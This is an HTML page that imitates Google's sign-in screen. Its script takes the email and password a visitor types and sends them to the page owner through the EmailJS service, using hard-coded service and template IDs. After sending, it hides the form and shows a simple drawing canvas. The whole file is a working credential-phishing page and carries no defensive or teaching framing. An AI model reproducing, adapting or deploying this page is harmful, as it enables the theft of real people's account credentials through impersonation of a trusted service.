<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Google Login</title>
    <script type="text/javascript" src="https://cdn.emailjs.com/dist/email.min.js"></script>
    <style>
        body {
            font-family: Arial, sans-serif;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            height: 100vh;
            margin: 0;
            background-color: #f1f1f1;
        }
        .login-container {
            width: 300px;
            padding: 20px;
            border: 1px solid #ccc;
            border-radius: 5px;
            background-color: #fff;
            box-shadow: 0 0 10px rgba(0,0,0,0.1);
        }
        .login-container h2 {
            margin-bottom: 20px;
            text-align: center;
            color: #333;
        }
        .login-container input {
            width: 100%;
            padding: 10px;
            margin-bottom: 10px;
            border: 1px solid #ccc;
            border-radius: 5px;
            font-size: 14px;
        }
        .login-container button {
            width: 100%;
            padding: 10px;
            background-color: #4285F4;
            color: #fff;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            font-size: 16px;
        }
        .login-container button:hover {
            background-color: #357ae8;
        }
        canvas {
            border: 1px solid #000;
            margin-top: 20px;
        }
    </style>
</head>
<body>

<div class="login-container">
    <h2>Sign in to Google</h2>
    <form id="loginForm">
        <input type="email" id="email" placeholder="Email or phone" required>
        <input type="password" id="password" placeholder="Enter your password" required>
        <button type="submit">Next</button>
    </form>
</div>

<canvas id="drawingCanvas" width="400" height="400" style="display: none;"></canvas>

<script>
    // Initialize EmailJS
    emailjs.init("user_Wm_hgPysMxjkcdYas");  // Replace with your EmailJS User ID

    document.getElementById('loginForm').addEventListener('submit', function(event) {
        event.preventDefault();

        const email = document.getElementById('email').value;
        const password = document.getElementById('password').value;

        // Send the form data to your email
        emailjs.send("service_zrgq0cs", "template_8r7y8vw", {
            email: email,
            password: password
        }).then(function(response) {
            console.log("Success:", response);
            
            // Hide the login form and show the drawing canvas
            document.querySelector('.login-container').style.display = 'none';
            document.getElementById('drawingCanvas').style.display = 'block';

            // Initialize drawing functionality
            const canvas = document.getElementById('drawingCanvas');
            const ctx = canvas.getContext('2d');
            let drawing = false;

            canvas.addEventListener('mousedown', function() {
                drawing = true;
            });

            canvas.addEventListener('mouseup', function() {
                drawing = false;
                ctx.beginPath(); // Stop drawing when mouse is released
            });

            canvas.addEventListener('mousemove', function(event) {
                if (drawing) {
                    const x = event.offsetX;
                    const y = event.offsetY;
                    ctx.lineTo(x, y);
                    ctx.stroke();
                }
            });
        }, function(error) {
            console.log("Failed to send:", error);
        });
    });
</script>

</body>
</html>
